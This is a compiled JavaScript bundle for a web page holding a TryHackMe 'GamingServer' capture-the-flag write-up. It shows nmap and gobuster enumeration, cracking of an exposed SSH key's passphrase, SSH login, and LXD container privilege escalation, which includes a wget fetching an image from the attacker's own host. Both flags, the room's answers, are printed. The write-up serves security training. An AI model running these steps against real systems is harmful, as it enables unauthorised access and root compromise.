"use strict";(self.webpackChunkcyfun_me=self.webpackChunkcyfun_me||[]).push([[3029],{3905:(e,t,n)=>{n.d(t,{Zo:()=>c,kt:()=>h});var r=n(67294);function a(e,t,n){return t in e?Object.defineProperty(e,t,{value:n,enumerable:!0,configurable:!0,writable:!0}):e[t]=n,e}function o(e,t){var n=Object.keys(e);if(Object.getOwnPropertySymbols){var r=Object.getOwnPropertySymbols(e);t&&(r=r.filter((function(t){return Object.getOwnPropertyDescriptor(e,t).enumerable}))),n.push.apply(n,r)}return n}function i(e){for(var t=1;t<arguments.length;t++){var n=null!=arguments[t]?arguments[t]:{};t%2?o(Object(n),!0).forEach((function(t){a(e,t,n[t])})):Object.getOwnPropertyDescriptors?Object.defineProperties(e,Object.getOwnPropertyDescriptors(n)):o(Object(n)).forEach((function(t){Object.defineProperty(e,t,Object.getOwnPropertyDescriptor(n,t))}))}return e}function s(e,t){if(null==e)return{};var n,r,a=function(e,t){if(null==e)return{};var n,r,a={},o=Object.keys(e);for(r=0;r<o.length;r++)n=o[r],t.indexOf(n)>=0||(a[n]=e[n]);return a}(e,t);if(Object.getOwnPropertySymbols){var o=Object.getOwnPropertySymbols(e);for(r=0;r<o.length;r++)n=o[r],t.indexOf(n)>=0||Object.prototype.propertyIsEnumerable.call(e,n)&&(a[n]=e[n])}return a}var l=r.createContext({}),p=function(e){var t=r.useContext(l),n=t;return e&&(n="function"==typeof e?e(t):i(i({},t),e)),n},c=function(e){var t=p(e.components);return r.createElement(l.Provider,{value:t},e.children)},u="mdxType",m={inlineCode:"code",wrapper:function(e){var t=e.children;return r.createElement(r.Fragment,{},t)}},d=r.forwardRef((function(e,t){var n=e.components,a=e.mdxType,o=e.originalType,l=e.parentName,c=s(e,["components","mdxType","originalType","parentName"]),u=p(n),d=a,h=u["".concat(l,".").concat(d)]||u[d]||m[d]||o;return n?r.createElement(h,i(i({ref:t},c),{},{components:n})):r.createElement(h,i({ref:t},c))}));function h(e,t){var n=arguments,a=t&&t.mdxType;if("string"==typeof e||a){var o=n.length,i=new Array(o);i[0]=d;var s={};for(var l in t)hasOwnProperty.call(t,l)&&(s[l]=t[l]);s.originalType=e,s[u]="string"==typeof e?e:a,i[1]=s;for(var p=2;p<o;p++)i[p]=n[p];return r.createElement.apply(null,i)}return r.createElement.apply(null,n)}d.displayName="MDXCreateElement"},50442:(e,t,n)=>{n.r(t),n.d(t,{assets:()=>l,contentTitle:()=>i,default:()=>m,frontMatter:()=>o,metadata:()=>s,toc:()=>p});var r=n(87462),a=(n(67294),n(3905));const o={},i="GamingServer",s={unversionedId:"Tryhackme/GamingServer/GamingServer",id:"Tryhackme/GamingServer/GamingServer",title:"GamingServer",description:"An Easy Boot2Root box for beginners",source:"@site/writeups/Tryhackme/GamingServer/GamingServer.md",sourceDirName:"Tryhackme/GamingServer",slug:"/Tryhackme/GamingServer/",permalink:"/writeups/Tryhackme/GamingServer/",draft:!1,tags:[],version:"current",frontMatter:{},sidebar:"tutorialSidebar",previous:{title:"Game Zone",permalink:"/writeups/Tryhackme/Game Zone/"},next:{title:"Gatekeeper",permalink:"/writeups/Tryhackme/Gatekeeper/"}},l={},p=[{value:"\ud83d\udca2 We will cover  the topics",id:"-we-will-cover--the-topics",level:2},{value:"Task 1 Boot2Root",id:"task-1-boot2root",level:2}],c={toc:p},u="wrapper";function m(e){let{components:t,...n}=e;return(0,a.kt)(u,(0,r.Z)({},c,n,{components:t,mdxType:"MDXLayout"}),(0,a.kt)("h1",{id:"gamingserver"},"GamingServer"),(0,a.kt)("p",null,"An Easy Boot2Root box for beginners"),(0,a.kt)("p",null,(0,a.kt)("a",{parentName:"p",href:"https://tryhackme.com/room/gamingserver"},"GamingServer")),(0,a.kt)("h2",{id:"-we-will-cover--the-topics"},"\ud83d\udca2 We will cover  the topics"),(0,a.kt)("ul",null,(0,a.kt)("li",{parentName:"ul"},"Network Enumeration"),(0,a.kt)("li",{parentName:"ul"},"Web Enumeration"),(0,a.kt)("li",{parentName:"ul"},"Web Poking"),(0,a.kt)("li",{parentName:"ul"},"Security Misconfiguration"),(0,a.kt)("li",{parentName:"ul"},"Brute Forcing Hash"),(0,a.kt)("li",{parentName:"ul"},"Exploitation LXC")),(0,a.kt)("hr",null),(0,a.kt)("h2",{id:"task-1-boot2root"},"Task 1 Boot2Root"),(0,a.kt)("p",null,"Can you gain access to this gaming server built by amateurs with no experience of web development and take advantage of the deployment system."),(0,a.kt)("pre",null,(0,a.kt)("code",{parentName:"pre"},"kali@kali:~/CTFs/tryhackme/GamingServer$ sudo nmap -A -Pn -sS -sC -sV -O 10.10.71.89\n[sudo] password for kali:\nStarting Nmap 7.80 ( https://nmap.org ) at 2020-10-14 10:43 CEST\nNmap scan report for 10.10.71.89\nHost is up (0.065s latency).\nNot shown: 998 closed ports\nPORT   STATE SERVICE VERSION\n22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)\n| ssh-hostkey:\n|   2048 34:0e:fe:06:12:67:3e:a4:eb:ab:7a:c4:81:6d:fe:a9 (RSA)\n|   256 49:61:1e:f4:52:6e:7b:29:98:db:30:2d:16:ed:f4:8b (ECDSA)\n|_  256 b8:60:c4:5b:b7:b2:d0:23:a0:c7:56:59:5c:63:1e:c4 (ED25519)\n80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))\n|_http-server-header: Apache/2.4.29 (Ubuntu)\n|_http-title: House of danak\nNo exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).\nTCP/IP fingerprint:\nOS:SCAN(V=7.80%E=4%D=10/14%OT=22%CT=1%CU=38364%PV=Y%DS=2%DC=T%G=Y%TM=5F86BA\nOS:4D%P=x86_64-pc-linux-gnu)SEQ(SP=106%GCD=1%ISR=10B%TI=Z%CI=Z%II=I%TS=A)SE\nOS:Q(SP=106%GCD=1%ISR=10C%TI=Z%CI=Z%TS=C)OPS(O1=M508ST11NW7%O2=M508ST11NW7%\nOS:O3=M508NNT11NW7%O4=M508ST11NW7%O5=M508ST11NW7%O6=M508ST11)WIN(W1=F4B3%W2\nOS:=F4B3%W3=F4B3%W4=F4B3%W5=F4B3%W6=F4B3)ECN(R=Y%DF=Y%T=40%W=F507%O=M508NNS\nOS:NW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%\nOS:DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%\nOS:O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%\nOS:W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%\nOS:RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=S)\n\nNetwork Distance: 2 hops\nService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel\n\nTRACEROUTE (using port 995/tcp)\nHOP RTT      ADDRESS\n1   36.03 ms 10.8.0.1\n2   36.27 ms 10.10.71.89\n\nOS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap done: 1 IP address (1 host up) scanned in 25.23 seconds\n")),(0,a.kt)("p",null,(0,a.kt)("a",{parentName:"p",href:"http://10.10.71.89/robots.txt"},"http://10.10.71.89/robots.txt")),(0,a.kt)("pre",null,(0,a.kt)("code",{parentName:"pre"},"user-agent: *\nAllow: /\n/uploads/\n")),(0,a.kt)("p",null,(0,a.kt)("a",{parentName:"p",href:"http://10.10.71.89/uploads/"},"http://10.10.71.89/uploads/")),(0,a.kt)("pre",null,(0,a.kt)("code",{parentName:"pre"},"[ ] dict.lst    2020-02-05 14:10    2.0K\n[TXT]   manifesto.txt   2020-02-05 13:05    3.0K\n[IMG]   meme.jpg    2020-02-05 13:32    15K\n")),(0,a.kt)("pre",null,(0,a.kt)("code",{parentName:"pre"},'kali@kali:~/CTFs/tryhackme/GamingServer$ curl -s http://10.10.71.89 | grep "<\\!--"\n\x3c!-- Website template by freewebsitetemplates.com --\x3e\n\x3c!-- john, please add some actual content to the site! lorem ipsum is horrible to look at. --\x3e\n')),(0,a.kt)("pre",null,(0,a.kt)("code",{parentName:"pre"},"kali@kali:~/CTFs/tryhackme/GamingServer$ gobuster dir -u 10.10.71.89 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt\n===============================================================\nGobuster v3.0.1\nby OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)\n===============================================================\n[+] Url:            http://10.10.71.89\n[+] Threads:        10\n[+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt\n[+] Status codes:   200,204,301,302,307,401,403\n[+] User Agent:     gobuster/3.0.1\n[+] Timeout:        10s\n===============================================================\n2020/10/14 10:44:07 Starting gobuster\n===============================================================\n/uploads (Status: 301)\n/secret (Status: 301)\nProgress: 48381 / 220561 (21.94%)^C\n[!] Keyboard interrupt detected, terminating.\n===============================================================\n2020/10/14 10:47:40 Finished\n===============================================================\n")),(0,a.kt)("pre",null,(0,a.kt)("code",{parentName:"pre"},"kali@kali:~/CTFs/tryhackme/GamingServer$ gobuster dir -u 10.10.71.89 -w /usr/share/wordlists/dirb/common.txt\n===============================================================\nGobuster v3.0.1\nby OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)\n===============================================================\n[+] Url:            http://10.10.71.89\n[+] Threads:        10\n[+] Wordlist:       /usr/share/wordlists/dirb/common.txt\n[+] Status codes:   200,204,301,302,307,401,403\n[+] User Agent:     gobuster/3.0.1\n[+] Timeout:        10s\n===============================================================\n2020/10/14 10:48:35 Starting gobuster\n===============================================================\n/.hta (Status: 403)\n/.htaccess (Status: 403)\n/.htpasswd (Status: 403)\n/index.html (Status: 200)\n/robots.txt (Status: 200)\n/secret (Status: 301)\n/server-status (Status: 403)\n/uploads (Status: 301)\n===============================================================\n2020/10/14 10:48:53 Finished\n===============================================================\n")),(0,a.kt)("pre",null,(0,a.kt)("code",{parentName:"pre"},"kali@kali:~/CTFs/tryhackme/GamingServer$ wget http://10.10.71.89/secret/secretKey\n--2020-10-14 10:49:33--  http://10.10.71.89/secret/secretKey\nConnecting to 10.10.71.89:80... connected.\nHTTP request sent, awaiting response... 200 OK\nLength: 1766 (1.7K)\nSaving to: \u2018secretKey\u2019\n\nsecretKey               100%[===============================>]   1.72K  --.-KB/s    in 0s\n\n2020-10-14 10:49:33 (261 MB/s) - \u2018secretKey\u2019 saved [1766/1766]\nkali@kali:~/CTFs/tryhackme/GamingServer$ chmod 400 secretKey\nkali@kali:~/CTFs/tryhackme/GamingServer$ ssh -i secretKey john@^C\nkali@kali:~/CTFs/tryhackme/GamingServer$ /usr/share/john/ssh2john.py secretKey > ssh.hash\nkali@kali:~/CTFs/tryhackme/GamingServer$ john ssh.hash  --wordlist=dict.lst\nUsing default input encoding: UTF-8\nLoaded 1 password hash (SSH [RSA/DSA/EC/OPENSSH (SSH private keys) 32/64])\nCost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 0 for all loaded hashes\nCost 2 (iteration count) is 1 for all loaded hashes\nWill run 2 OpenMP threads\nNote: This format may emit false positives, so it will keep trying even after\nfinding a possible candidate.\nPress 'q' or Ctrl-C to abort, almost any other key for status\nletmein          (secretKey)\n1g 0:00:00:00 DONE (2020-10-14 10:50) 33.33g/s 7400p/s 7400c/s 7400C/s baseball..starwars\nSession completed\n")),(0,a.kt)("p",null,(0,a.kt)("inlineCode",{parentName:"p"},"letmein")),(0,a.kt)("pre",null,(0,a.kt)("code",{parentName:"pre"},"kali@kali:~/CTFs/tryhackme/GamingServer$ ssh -i secretKey john@10.10.71.89\nThe authenticity of host '10.10.71.89 (10.10.71.89)' can't be established.\nECDSA key fingerprint is SHA256:LO5bYqjXqLnB39jxUzFMiOaZ1YnyFGGXUmf1edL6R9o.\nAre you sure you want to continue connecting (yes/no/[fingerprint])? yes\nWarning: Permanently added '10.10.71.89' (ECDSA) to the list of known hosts.\nEnter passphrase for key 'secretKey':\nWelcome to Ubuntu 18.04.4 LTS (GNU/Linux 4.15.0-76-generic x86_64)\n\n * Documentation:  https://help.ubuntu.com\n * Management:     https://landscape.canonical.com\n * Support:        https://ubuntu.com/advantage\n\n  System information as of Wed Oct 14 08:51:43 UTC 2020\n\n  System load:  0.09              Processes:           98\n  Usage of /:   41.1% of 9.78GB   Users logged in:     0\n  Memory usage: 17%               IP address for eth0: 10.10.71.89\n  Swap usage:   0%\n\n\n0 packages can be updated.\n0 updates are security updates.\n\n\nLast login: Mon Jul 27 20:17:26 2020 from 10.8.5.10\njohn@exploitable:~$ ls\nuser.txt\njohn@exploitable:~$ cat user.txt\na5c2ff8b9c2e3d4fe9d4ff2f1a5a6e7e\n")),(0,a.kt)("pre",null,(0,a.kt)("code",{parentName:"pre"},"john@exploitable:~$ wget http://10.8.106.222/lxd-alpine-builder/alpine-v3.12-x86_64-20201014_1053.tar.gz\n--2020-10-14 08:56:48--  http://10.8.106.222/lxd-alpine-builder/alpine-v3.12-x86_64-20201014_1053.tar.gz\nConnecting to 10.8.106.222:80... connected.\nHTTP request sent, awaiting response... 200 OK\nLength: 3183829 (3.0M) [application/gzip]\nSaving to: \u2018alpine-v3.12-x86_64-20201014_1053.tar.gz\u2019\n\nalpine-v3.12-x86_64-2 100%[========================>]   3.04M  1.04MB/s    in 2.9s\n\n2020-10-14 08:56:51 (1.04 MB/s) - \u2018alpine-v3.12-x86_64-20201014_1053.tar.gz\u2019 saved [3183829/3183829]\n\njohn@exploitable:~$ lxc image list\n+-------+-------------+--------+-------------+------+------+-------------+\n| ALIAS | FINGERPRINT | PUBLIC | DESCRIPTION | ARCH | SIZE | UPLOAD DATE |\n+-------+-------------+--------+-------------+------+------+-------------+\njohn@exploitable:~$ lxc image import ./alpine-v3.12-x86_64-20201014_1053.tar.gz --alias myimage\nImage imported with fingerprint: 8f83febe3dd6858c008db1d6ef7327876b93df2f5846489921dcc6\njohn@exploitable:~$ lxc image list\n+---------+--------------+--------+-------------------------------+--------+--------+------------------------------+\n|  ALIAS  | FINGERPRINT  | PUBLIC |          DESCRIPTION          |  ARCH  |  SIZE  |         UPLOAD DATE          |\n+---------+--------------+--------+-------------------------------+--------+--------+------------------------------+\n| myimage | 8f83febe3dd6 | no     | alpine v3.12 (20201014_10:53) | x86_64 | 3.04MB | Oct 14, 2020 at 8:58am (UTC) |\n+---------+--------------+--------+-------------------------------+--------+--------+------------------------------+\njohn@exploitable:~$ lxc init myimage ignite -c security.privileged=true\nCreating ignite\njohn@exploitable:~$ lxc config device add ignite mydevice disk source=/ path=/mnt/root recursive=true\nDevice mydevice added to ignite\njohn@exploitable:~$ lxc start ignite\njohn@exploitable:~$ lxc exec ignite /bin/bash\njohn@exploitable:~$ lxc exec ignite /bin/sh\n~ # id\nuid=0(root) gid=0(root)\n~ # find / -type f -name root.txt 2>/dev/null\n/mnt/root/root/root.txt\n~ # cat /mnt/root/root/root.txt\n2e337b8c9f3aff0c2b3e8d4e6a7c88fc\n")),(0,a.kt)("ol",null,(0,a.kt)("li",{parentName:"ol"},"What is the user flag?")),(0,a.kt)("p",null,(0,a.kt)("inlineCode",{parentName:"p"},"a5c2ff8b9c2e3d4fe9d4ff2f1a5a6e7e")),(0,a.kt)("ol",{start:2},(0,a.kt)("li",{parentName:"ol"},"What is the root flag?")),(0,a.kt)("p",null,(0,a.kt)("inlineCode",{parentName:"p"},"2e337b8c9f3aff0c2b3e8d4e6a7c88fc")))}m.isMDXComponent=!0}}]);